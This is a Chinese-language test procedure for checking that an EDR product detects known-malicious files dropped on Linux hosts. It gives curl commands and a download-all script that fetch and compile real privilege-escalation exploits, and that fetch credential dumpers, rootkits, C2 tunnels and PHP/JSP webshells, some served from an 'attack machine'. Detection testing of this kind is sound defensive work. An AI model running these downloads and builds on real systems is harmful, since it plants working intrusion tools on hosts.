# EDR Hash Hunting 驗測 SOP — Linux（檔案落地偵測）

> **目的**：透過下載已知惡意工具 / PoC exploit 至受測端點，驗證 EDR 的檔案落地偵測、hash hunting 記錄是否正常運作。
> **偵測原理**：EDR agent 監控檔案寫入 → 計算 hash → 比對威脅情報資料庫 → 產生告警
> **適用平台**：任何安裝 Xensor Agent 的 Linux 端點

---

## 測試方法總覽

所有測試遵循同一模式：

```
curl/wget 下載已知惡意檔案 → 檔案落地磁碟 → EDR 掃描 hash → 觸發告警
```

重點是**檔案落地到磁碟**這個動作本身，不需要真的執行。

---

## Phase 0：環境準備

### 0-1. 確認 EDR Agent 運行中

```bash
systemctl status xensor-agent
ps aux | grep -i xensor
```

### 0-2. 建立測試目錄與時間戳

```bash
mkdir -p /opt/edr_test
date -u '+%Y-%m-%dT%H:%M:%SZ' | tee /opt/edr_test/test_start_time.txt
```

### 0-3. 準備 Hash 追蹤表

每個測試下載完成後立即記錄 SHA256，後續到 XCockpit Hash Hunting 比對。

```bash
# 下載完檔案後統一產出 hash
sha256sum /opt/edr_test/* > /opt/edr_test/hash_manifest.txt
```

---

## Phase 1：權限提升 Exploit PoC

### 1-1. PwnKit — CVE-2021-4034（pkexec 提權）

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \
  -o /opt/edr_test/PwnKit
sha256sum /opt/edr_test/PwnKit
```

| 項目 | 說明 |
|---|---|
| CVE | CVE-2021-4034 |
| 類型 | Polkit pkexec 本地提權 |
| 預期偵測 | 已知 exploit 工具 hash 命中 |

### 1-2. DirtyPipe — CVE-2022-0847（Kernel 提權）

```bash
# PoC 源碼
curl -fsSL https://raw.githubusercontent.com/AlexisAhworworworworworr/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c \
  -o /opt/edr_test/dirtypipe_exploit.c

# 編譯為 binary（產生新 hash，測試行為偵測）
gcc /opt/edr_test/dirtypipe_exploit.c -o /opt/edr_test/dirtypipe_exploit 2>/dev/null
sha256sum /opt/edr_test/dirtypipe_exploit* 2>/dev/null
```

| 項目 | 說明 |
|---|---|
| CVE | CVE-2022-0847 |
| 類型 | Kernel pipe 任意寫入提權 |
| 預期偵測 | 源碼 hash 或編譯後 binary 行為偵測 |

### 1-3. DirtyCow — CVE-2016-5195（經典 Kernel 提權）

```bash
curl -fsSL https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c \
  -o /opt/edr_test/dirtycow.c

gcc -pthread /opt/edr_test/dirtycow.c -o /opt/edr_test/dirtycow -lcrypt 2>/dev/null
sha256sum /opt/edr_test/dirtycow* 2>/dev/null
```

| 項目 | 說明 |
|---|---|
| CVE | CVE-2016-5195 |
| 類型 | Kernel copy-on-write race condition |
| 預期偵測 | 高知名度 exploit hash 命中 |

### 1-4. Baron Samedit — CVE-2021-3156（sudo 提權）

```bash
# blasty 版 exploit
curl -fsSL https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c \
  -o /opt/edr_test/baron_samedit.c

gcc /opt/edr_test/baron_samedit.c -o /opt/edr_test/baron_samedit 2>/dev/null
sha256sum /opt/edr_test/baron_samedit* 2>/dev/null
```

| 項目 | 說明 |
|---|---|
| CVE | CVE-2021-3156 |
| 類型 | sudo heap-based buffer overflow |
| 預期偵測 | 已知 sudo exploit hash / 工具名稱比對 |

### 1-5. Looney Tunables — CVE-2023-4911（glibc 提權）

```bash
curl -fsSL https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/poc.c \
  -o /opt/edr_test/looney_tunables.c

gcc /opt/edr_test/looney_tunables.c -o /opt/edr_test/looney_tunables 2>/dev/null
sha256sum /opt/edr_test/looney_tunables* 2>/dev/null
```

| 項目 | 說明 |
|---|---|
| CVE | CVE-2023-4911 |
| 類型 | glibc ld.so GLIBC_TUNABLES buffer overflow |
| 預期偵測 | 近期高風險 CVE exploit hash |

---

## Phase 2：後滲透 / 列舉工具

### 2-1. LinPEAS — Linux 提權列舉腳本

```bash
curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
  -o /opt/edr_test/linpeas.sh
sha256sum /opt/edr_test/linpeas.sh
```

| 項目 | 說明 |
|---|---|
| 工具 | LinPEAS (Privilege Escalation Awesome Scripts) |
| 類型 | 自動化提權資訊蒐集 |
| 預期偵測 | 已知 hacking tool hash 命中 |

### 2-2. LinEnum — Linux 列舉腳本

```bash
curl -fsSL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh \
  -o /opt/edr_test/LinEnum.sh
sha256sum /opt/edr_test/LinEnum.sh
```

| 項目 | 說明 |
|---|---|
| 工具 | LinEnum |
| 類型 | 系統列舉 / 偵察 |
| 預期偵測 | 已知列舉工具 hash |

### 2-3. linux-exploit-suggester

```bash
curl -fsSL https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh \
  -o /opt/edr_test/linux-exploit-suggester.sh
sha256sum /opt/edr_test/linux-exploit-suggester.sh
```

| 項目 | 說明 |
|---|---|
| 工具 | linux-exploit-suggester |
| 類型 | Kernel exploit 可用性檢查 |
| 預期偵測 | 已知攻擊工具 hash |

### 2-4. pspy — 無 root 程序監控

```bash
curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 \
  -o /opt/edr_test/pspy64
chmod +x /opt/edr_test/pspy64
sha256sum /opt/edr_test/pspy64
```

| 項目 | 說明 |
|---|---|
| 工具 | pspy |
| 類型 | 不需 root 的程序監控（偵察用） |
| 預期偵測 | 已知 hacking tool binary hash |

---

## Phase 3：憑證竊取工具

### 3-1. Mimipenguin — Linux 版 Mimikatz

```bash
curl -fsSL https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh \
  -o /opt/edr_test/mimipenguin.sh

curl -fsSL https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.py \
  -o /opt/edr_test/mimipenguin.py

sha256sum /opt/edr_test/mimipenguin*
```

| 項目 | 說明 |
|---|---|
| 工具 | mimipenguin |
| 類型 | 從記憶體擷取明文密碼 |
| 預期偵測 | 高危 credential dumping 工具 hash |

### 3-2. LaZagne — 多平台密碼擷取

```bash
curl -fsSL https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Linux/laZagne.py \
  -o /opt/edr_test/laZagne.py
sha256sum /opt/edr_test/laZagne.py
```

| 項目 | 說明 |
|---|---|
| 工具 | LaZagne |
| 類型 | 瀏覽器/系統儲存密碼擷取 |
| 預期偵測 | 已知密碼竊取工具 hash |

---

## Phase 4：Rootkit / 持久化工具

### 4-1. Reptile Rootkit

```bash
curl -fsSL https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.tar.gz \
  -o /opt/edr_test/reptile.tar.gz
sha256sum /opt/edr_test/reptile.tar.gz
```

| 項目 | 說明 |
|---|---|
| 工具 | Reptile |
| 類型 | Linux LKM rootkit |
| 預期偵測 | 已知 rootkit 套件 hash |

### 4-2. Diamorphine Rootkit

```bash
curl -fsSL https://github.com/m0nad/Diamorphine/archive/refs/heads/master.tar.gz \
  -o /opt/edr_test/diamorphine.tar.gz
sha256sum /opt/edr_test/diamorphine.tar.gz
```

| 項目 | 說明 |
|---|---|
| 工具 | Diamorphine |
| 類型 | Linux LKM rootkit |
| 預期偵測 | 已知 rootkit 套件 hash |

---

## Phase 5：C2 / 隧道工具

### 5-1. Chisel — TCP/UDP 隧道

```bash
curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz \
  -o /opt/edr_test/chisel.gz
gunzip /opt/edr_test/chisel.gz 2>/dev/null
sha256sum /opt/edr_test/chisel
```

| 項目 | 說明 |
|---|---|
| 工具 | Chisel |
| 類型 | HTTP 上的 TCP 隧道（C2 常用） |
| 預期偵測 | 已知 tunnel 工具 binary hash |

### 5-2. Ligolo-ng — 反向隧道

```bash
curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz \
  -o /opt/edr_test/ligolo_agent.tar.gz
tar xzf /opt/edr_test/ligolo_agent.tar.gz -C /opt/edr_test/ 2>/dev/null
sha256sum /opt/edr_test/agent
```

| 項目 | 說明 |
|---|---|
| 工具 | Ligolo-ng |
| 類型 | 反向 tunnel agent |
| 預期偵測 | 已知 C2 tunnel 工具 hash |

### 5-3. Sliver C2 Implant

```bash
# Sliver 需要自行從 C2 server 產出 implant
# 若有 Sliver server，產出 Linux implant：
# sliver > generate --os linux --arch amd64 --save /tmp/sliver_implant
# scp /tmp/sliver_implant user@target:/opt/edr_test/

# 替代：下載 Sliver server binary（也應觸發 hash 偵測）
curl -fsSL https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux \
  -o /opt/edr_test/sliver-server
sha256sum /opt/edr_test/sliver-server
```

| 項目 | 說明 |
|---|---|
| 工具 | Sliver |
| 類型 | 開源 C2 框架 |
| 預期偵測 | 高知名度 C2 工具 hash |

---

## Phase 6：掃描 / 網路偵察工具

### 6-1. fscan — 內網掃描器

```bash
curl -fsSL https://github.com/shadow1ng/fscan/releases/latest/download/fscan_amd64 \
  -o /opt/edr_test/fscan
chmod +x /opt/edr_test/fscan
sha256sum /opt/edr_test/fscan
```

| 項目 | 說明 |
|---|---|
| 工具 | fscan |
| 類型 | 內網綜合掃描（中國紅隊常用） |
| 預期偵測 | 已知攻擊掃描工具 hash |

### 6-2. Stowaway — 多級代理

```bash
curl -fsSL https://github.com/ph4ntonn/Stowaway/releases/latest/download/linux_x64_agent \
  -o /opt/edr_test/stowaway_agent
sha256sum /opt/edr_test/stowaway_agent
```

| 項目 | 說明 |
|---|---|
| 工具 | Stowaway |
| 類型 | 多級代理隧道工具 |
| 預期偵測 | 已知代理工具 hash |

### 6-3. Frp — 反向代理

```bash
curl -fsSL https://github.com/fatedier/frp/releases/latest/download/frp_0.61.1_linux_amd64.tar.gz \
  -o /opt/edr_test/frp.tar.gz
tar xzf /opt/edr_test/frp.tar.gz -C /opt/edr_test/ 2>/dev/null
sha256sum /opt/edr_test/frp_*/frpc
```

| 項目 | 說明 |
|---|---|
| 工具 | frp (frpc client) |
| 類型 | 反向代理（常被濫用於 C2 中繼） |
| 預期偵測 | 知名代理工具 hash（灰色地帶，視 EDR 威脅情報庫） |

---

## Phase 7：Webshell

### 7-1. 常見 PHP Webshell

```bash
# b374k webshell
curl -fsSL https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/b374k-3.2.3.php \
  -o /opt/edr_test/b374k.php
sha256sum /opt/edr_test/b374k.php

# c99 webshell
curl -fsSL https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php \
  -o /opt/edr_test/c99.php
sha256sum /opt/edr_test/c99.php
```

| 項目 | 說明 |
|---|---|
| 工具 | b374k / c99 webshell |
| 類型 | PHP webshell |
| 預期偵測 | 已知 webshell hash / 特徵碼 |

### 7-2. JSP Webshell（若有 Java 環境）

```bash
curl -fsSL https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspspy/jspspy.jsp \
  -o /opt/edr_test/jspspy.jsp
sha256sum /opt/edr_test/jspspy.jsp
```

---

## 執行 SOP（統一流程）

每個 Phase 完成下載後，執行以下標準流程：

### Step 1：統一產出 Hash 清單

```bash
sha256sum /opt/edr_test/* 2>/dev/null | tee /opt/edr_test/hash_manifest.txt
```

### Step 2：記錄完成時間

```bash
date -u '+%Y-%m-%dT%H:%M:%SZ' | tee -a /opt/edr_test/test_start_time.txt
```

### Step 3：等待 EDR 處理

等待 **1–5 分鐘**（依 agent 回報頻率而定）。

### Step 4：到 XCockpit 驗證

1. **Hash Hunting** → 逐一貼上 hash_manifest.txt 裡的 SHA256 搜尋
2. **告警列表** → 篩選測試時間區間，確認告警產生
3. **記錄結果**至下方追蹤表

### Step 5：清理

```bash
sudo rm -rf /opt/edr_test
```

---

## Hash Hunting 結果追蹤表

| # | 類別 | 工具名稱 | CVE / 說明 | SHA256 | 告警(Y/N) | Hash 命中(Y/N) | 告警名稱 | 備註 |
|---|---|---|---|---|---|---|---|---|
| 1 | 提權 | PwnKit | CVE-2021-4034 | | | | | |
| 2 | 提權 | DirtyPipe | CVE-2022-0847 | | | | | |
| 3 | 提權 | DirtyCow | CVE-2016-5195 | | | | | |
| 4 | 提權 | Baron Samedit | CVE-2021-3156 | | | | | |
| 5 | 提權 | Looney Tunables | CVE-2023-4911 | | | | | |
| 6 | 列舉 | LinPEAS | 提權列舉 | | | | | |
| 7 | 列舉 | LinEnum | 系統列舉 | | | | | |
| 8 | 列舉 | linux-exploit-suggester | exploit 建議 | | | | | |
| 9 | 列舉 | pspy | 程序監控 | | | | | |
| 10 | 憑證 | mimipenguin | 密碼擷取 | | | | | |
| 11 | 憑證 | LaZagne | 密碼擷取 | | | | | |
| 12 | Rootkit | Reptile | LKM rootkit | | | | | |
| 13 | Rootkit | Diamorphine | LKM rootkit | | | | | |
| 14 | C2 | Chisel | TCP tunnel | | | | | |
| 15 | C2 | Ligolo-ng | 反向 tunnel | | | | | |
| 16 | C2 | Sliver | C2 框架 | | | | | |
| 17 | 掃描 | fscan | 內網掃描 | | | | | |
| 18 | 代理 | Stowaway | 多級代理 | | | | | |
| 19 | 代理 | frpc | 反向代理 | | | | | |
| 20 | Webshell | b374k | PHP webshell | | | | | |
| 21 | Webshell | c99 | PHP webshell | | | | | |
| 22 | Webshell | jspspy | JSP webshell | | | | | |

---

## 一鍵全部下載腳本

將以下腳本存為 `download_all.sh`，一次下載所有測試樣本：

```bash
#!/bin/bash
set -e
DIR="/opt/edr_test"
mkdir -p "$DIR"
echo "[*] Test started at $(date -u '+%Y-%m-%dT%H:%M:%SZ')" | tee "$DIR/test_log.txt"

download() {
  local name="$1" url="$2" output="$3"
  echo "[+] Downloading $name..."
  curl -fsSL "$url" -o "$DIR/$output" 2>/dev/null && \
    echo "    OK: $output ($(sha256sum "$DIR/$output" | cut -d' ' -f1))" | tee -a "$DIR/test_log.txt" || \
    echo "    FAIL: $output" | tee -a "$DIR/test_log.txt"
}

echo "=== Phase 1: Privilege Escalation Exploits ==="
download "PwnKit"           "https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit" "PwnKit"
download "DirtyCow"         "https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c" "dirtycow.c"
download "Baron Samedit"    "https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c" "baron_samedit.c"
download "Looney Tunables"  "https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/poc.c" "looney_tunables.c"

echo -e "\n=== Phase 2: Post-Exploitation / Enumeration ==="
download "LinPEAS"                   "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" "linpeas.sh"
download "LinEnum"                   "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" "LinEnum.sh"
download "linux-exploit-suggester"   "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh" "linux-exploit-suggester.sh"
download "pspy64"                    "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" "pspy64"

echo -e "\n=== Phase 3: Credential Theft ==="
download "mimipenguin.sh"  "https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh" "mimipenguin.sh"
download "mimipenguin.py"  "https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.py" "mimipenguin.py"
download "LaZagne"         "https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Linux/laZagne.py" "laZagne.py"

echo -e "\n=== Phase 4: Rootkits ==="
download "Reptile"      "https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.tar.gz" "reptile.tar.gz"
download "Diamorphine"  "https://github.com/m0nad/Diamorphine/archive/refs/heads/master.tar.gz" "diamorphine.tar.gz"

echo -e "\n=== Phase 5: C2 / Tunneling ==="
download "Chisel"       "https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz" "chisel.gz"
download "Ligolo-ng"    "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz" "ligolo_agent.tar.gz"
download "Sliver"       "https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux" "sliver-server"

echo -e "\n=== Phase 6: Scanning / Proxy ==="
download "fscan"      "https://github.com/shadow1ng/fscan/releases/latest/download/fscan_amd64" "fscan"
download "frp"        "https://github.com/fatedier/frp/releases/latest/download/frp_0.61.1_linux_amd64.tar.gz" "frp.tar.gz"

echo -e "\n=== Phase 7: Webshells ==="
download "b374k"   "https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/b374k-3.2.3.php" "b374k.php"
download "c99"     "https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php" "c99.php"
download "jspspy"  "https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspspy/jspspy.jsp" "jspspy.jsp"

echo -e "\n=== Hash Manifest ==="
sha256sum "$DIR"/* 2>/dev/null | grep -v test_log | tee "$DIR/hash_manifest.txt"

echo -e "\n[*] Test completed at $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "[*] Total files: $(ls -1 "$DIR" | wc -l)"
echo "[*] Hash manifest: $DIR/hash_manifest.txt"
echo "[*] 請等待 1-5 分鐘後到 XCockpit 檢查 Hash Hunting 結果"
```

### 使用方式

```bash
chmod +x download_all.sh
sudo bash download_all.sh
```

### 清理

```bash
sudo rm -rf /opt/edr_test
```

---

## 補充：若 GitHub URL 被防火牆或 Proxy 阻擋

部分企業環境會擋 `raw.githubusercontent.com`，替代方案：

1. **在外部機器先下載**，用 USB 或 SCP 搬到受測機
2. **在攻擊機架 HTTP server**：
   ```bash
   # 攻擊機：把所有檔案放在 /tmp/payloads/ 下
   cd /tmp/payloads && python3 -m http.server 8888
   
   # 受測機：
   curl -fsSL http://<攻擊機IP>:8888/PwnKit -o /opt/edr_test/PwnKit
   ```
3. **用 Base64 傳輸**：
   ```bash
   # 攻擊機：
   base64 PwnKit > PwnKit.b64
   
   # 受測機：
   base64 -d PwnKit.b64 > /opt/edr_test/PwnKit
   ```

重點是**檔案最終落地到受測端磁碟**，傳輸方式不影響 hash 偵測。

---

## 預期結果判讀

| 結果 | 意義 | 後續動作 |
|---|---|---|
| Hash 命中 + 告警 | EDR 正常運作 | 記錄為 PASS |
| Hash 命中、無告警 | 威脅情報有收錄但告警規則未觸發 | 確認告警政策設定 |
| 無 Hash 命中、有告警 | 行為偵測觸發（非 hash 比對） | 記錄偵測方式為「行為」 |
| 無 Hash 命中、無告警 | 威脅情報未收錄該 hash | 回報給威脅情報團隊更新 |
| 檔案落地即被刪除 | EDR 有即時阻擋能力 | 記錄為最佳結果 |
